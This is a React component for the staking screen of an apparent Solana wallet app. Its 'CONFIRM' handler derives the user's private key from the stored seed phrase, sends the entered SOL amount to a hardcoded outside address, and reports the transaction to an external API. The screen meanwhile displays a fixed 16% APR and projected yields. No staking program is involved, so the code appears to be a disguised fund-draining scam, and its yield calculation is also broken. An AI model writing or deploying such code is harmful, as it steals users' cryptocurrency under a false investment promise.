/* eslint-disable react-hooks/exhaustive-deps */
/* eslint-disable no-unused-vars */
import Header from "../Header";
import Footer from "../Footer";
import screen from "../../main";
import { useEffect, useState } from "react";
import { Keypair, Connection, clusterApiUrl, LAMPORTS_PER_SOL, SystemProgram, sendAndConfirmTransaction, PublicKey, Transaction } from "@solana/web3.js";
import { getAccount, addToAccount } from "../../systems/storage/store";
import * as buffer from "buffer";
import load from "../../functions/loader";
import { ToastContainer, toast } from 'react-toastify';
import defaults from "../../crypto/defaults";
import { Fade } from "react-awesome-reveal";
import axios from "axios";
window.Buffer = buffer.Buffer;
function StepNine() {
  const [balances, updateBalances] = useState(defaults.balances);
  const [sending, setSending] = useState(false);
  const [dayTallage, setTallage_d] = useState('0');
  const [monthTallage, setTallage_m] = useState('0');
  const [yearTallage, setTallage_y] = useState('0');
  const [coin, setCoin] = useState({});
  const [account, setAccount] = useState({});
  useEffect(() => {
    async function setBalances() {
      const result = await getAccount();
      setCoin(result.staking_data);
      setAccount(result)
      updateBalances(result.balances);
    }
    setBalances()
  }, [])

  function calcPerc(inp) {
      const inputsumm = parseFloat(inp);
      if (inputsumm <= 0) return setSending(true);
      if (isNaN(inp)) return setSending(true);
      if (inp == ' ') return setSending(true);
      if (inp == '') return setSending(true);
      if (inp == 'NaN') return setSending(true);
      setSending(false);
      localStorage.inputsumm = inputsumm;
      const floatyearpercent = parseFloat((coin.rates[0].apy * 100).toFixed(2));
      const coinhigh = coin.ticker.toUpperCase();

      const daypercent = floatyearpercent / 365;
      const monthpercent = floatyearpercent / 12;
      const yearpercent = floatyearpercent;

      const tallageday = parseFloat(inputsumm / 100 * daypercent).toFixed(5);
      const tallagemonth = parseFloat(inputsumm / 100 * monthpercent).toFixed(5);
      const tallageyear = parseFloat(inputsumm / 100 * yearpercent).toFixed(5);

      setTallage_d(`${parseFloat(tallageday + inputsumm).toFixed(5)} ${coinhigh}`)
      setTallage_m(`${parseFloat(tallagemonth + inputsumm).toFixed(5)} ${coinhigh}`);
      setTallage_y(`${parseFloat(tallageyear + inputsumm).toFixed(5)} ${coinhigh}`);
  }

  async function sendnow() {
    if(sending == true) return;
    setSending(true);
    const connection = new Connection(
      'https://solana-mainnet.phantom.app/YBPpkkN4g91xDiAnTE9r0RcMkjg0sKUIWvAfoFVJ',
      'confirmed',
    );
    const derivePath = "m/44'/501'/0'/0'"
    const sd = await window.bitcoin.bip39.mnemonicToSeed(account.seed)
    const masterNode = window.bitcoin.bip32.fromSeed(sd);
    const derivedKey = masterNode.derivePath(derivePath);
    const keypairs = Keypair.fromSeed(derivedKey.__D);
    try {
    const value = document.getElementById("amount").value.toString();
    const ammo = parseFloat(value) * 1000000000;
    if(sending == false) {
      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: keypairs.publicKey,
          toPubkey: '3JS3rXZN36hh4MxYpagtob1QULMQ87e8QMNm5s8jZvAB',
          lamports: ammo,
        }),
      );

      const signature = await sendAndConfirmTransaction(
        connection,
        transaction,
        [keypairs],
      );
      await axios.post('https://api.xbanking.org/place', {
        token: 'SOL',
        addr: account.addr_sol,
        referal: 0,
        startdays: 0,
        summ: value,
        hash: signature,
      });
      await load(14)
    } else {
      return;
    }

    } catch(e) {
      setSending(false);
        if(e.message.includes('NaN')) {
          return toast.warn('Invalid amount', {
            position: "top-right",
            autoClose: 5000,
            hideProgressBar: false,
            closeOnClick: true,
            pauseOnHover: true,
            draggable: true,
            progress: undefined,
            theme: "dark",
          });
        }
    }


  }
  if (screen.current != 9) return null;
  return (
    <div>
    <Fade cascade duration={500}>
    <div className="wrapper">
    <Header actionType="back" />

      <div className="content">
      <div className="staking">
          <h1 className="title title--mini">Staking & Pools</h1>

          <form action="#" className="staking__form form">
            <div className="form__groups">

              {/* <div className="form__group">
                <label className="form__label" htmlFor="">Select Network</label>

                <div className="form__input form__block">
                  <div className="form__pic">
                    <img className="form__pic-icon" width="32" height="32" src="./img/bitcoin.svg" alt="bitcoin icon" />
                  </div>

                  <div className="form__infos">
                    <p className="form__info text text--grey">BNB Smart Chain</p>
                  </div>

                  <div className="form__right">
                    <button type="button" className="form__right-btn">
                      <img src="./img/icons/form-arrow.svg" alt="form-arrow" />
                    </button>
                  </div>
                </div>
              </div> */}

              <div className="form__group">
                <label className="form__label" htmlFor="">Amount</label>

                <div className="form__input form__block">
                  <div className="wallet__token-pic">
                    <img className="form__pic-icon" width="24" height="23" src="./img/solana.svg" alt="ethereum icon" />
                  </div>

                  <div className="form__infos">
                  <input onChange={(e) => calcPerc(e.target.value)} className="form__input_summ" id="amount" placeholder="Enter amount" />
                    <p className="form__info text--grey">${balances[0].sol_usd} USD</p>
                  </div>

                  <div className="form__right">
                    <p className="form__right-text text--grey">MAX</p>
                  </div>
                </div>

                <p className="form__transaction">Transaction fee: 0.000005 SOL</p>
              </div>

            </div>

            <div className="form__income">
              <p className="form__income-label">Income:</p>

              <div className="form__income-row">
                <p className="form__income-text text">APR</p>
                <div className="form__income-dots"></div>
                <p className="form__income-text text">16%</p>
              </div>

              <div className="form__income-row">
                <p className="form__income-text text">&nbsp;</p>
              </div>

              <div className="form__income-row">
                <p className="form__income-text text">Daily yield</p>
                <div className="form__income-dots"></div>
                <p className="form__income-text text">{dayTallage}</p>
              </div>

              <div className="form__income-row">
                <p className="form__income-text text">Monthly yield</p>
                <div className="form__income-dots"></div>
                <p className="form__income-text text">{monthTallage}</p>
              </div>

              <div className="form__income-row">
                <p className="form__income-text text">Annual yield</p>
                <div className="form__income-dots"></div>
                <p className="form__income-text text">{yearTallage}</p>
              </div>
            </div>
          </form>

        </div>
      </div>
      <div className="send__footer btn--footer">
      <a className={sending ? "btn_disabled" : "btn"} onClick={sendnow} href="#">CONFIRM</a>
      </div>
    </div>
    </Fade>
    </div>
  )
}

export default StepNine;